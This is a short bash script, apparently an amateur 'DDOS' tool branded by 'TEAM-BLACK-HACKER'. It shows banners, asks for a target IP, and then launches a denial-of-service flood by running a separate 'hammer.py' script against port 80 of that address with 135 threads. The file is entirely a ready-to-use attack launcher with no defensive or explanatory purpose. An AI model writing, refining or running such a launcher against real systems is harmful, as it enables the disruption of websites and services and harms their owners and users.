#!/bin/bash
a='\033[1;32m'
b='\033[1;36m'
c='\033[0;31m'
d='\033[0m'
clear
echo -e "${b}"
echo "  ____  ____   ___  ____ "
echo " |  _ \|  _ \ / _ \/ ___| "
echo " | | | | | | | | | \___ \ "
echo " | |_| | |_| | |_| |___) | "
echo " |____/|____/ \___/|____/ "
echo -e "${a}           Power by TEAM-BLACK-HACKER "
echo
read -p "ENTER YOUR TARGET IP : " ip
clear
echo -e "${b}"
echo "  ____  ____   ___  ____ "
echo " |  _ \|  _ \ / _ \/ ___| "
echo " | | | | | | | | | \___ \ "
echo " | |_| | |_| | |_| |___) | "
echo " |____/|____/ \___/|____/ "
echo -e "${a}           Power by TEAM-BLACK-HACKER"
echo -e "${c} ATTACK IS START / DOS IS START !!"
echo " Note: CTRL+C to off!! it. "
if [   $ip   ]
 then

cd hammer
   python3 hammer.py -s $ip -p 80 -t 135

fi
